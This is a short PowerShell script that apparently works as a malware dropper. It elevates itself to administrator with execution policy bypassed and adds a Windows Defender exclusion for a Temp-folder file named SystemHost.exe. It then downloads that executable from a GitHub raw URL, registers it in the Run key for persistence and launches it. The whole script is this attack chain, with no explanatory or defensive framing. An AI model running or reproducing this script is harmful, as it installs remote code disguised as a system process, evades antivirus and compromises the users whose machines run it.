if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File', $MyInvocation.MyCommand.Definition -Verb RunAs; exit }
Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"
Invoke-WebRequest -Uri 'https://github.com/Rdthaiphno064/tthinh/raw/refs/heads/main/SystemHost.exe' -OutFile "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemHost' -Value "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe" -Force
Start-Process "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"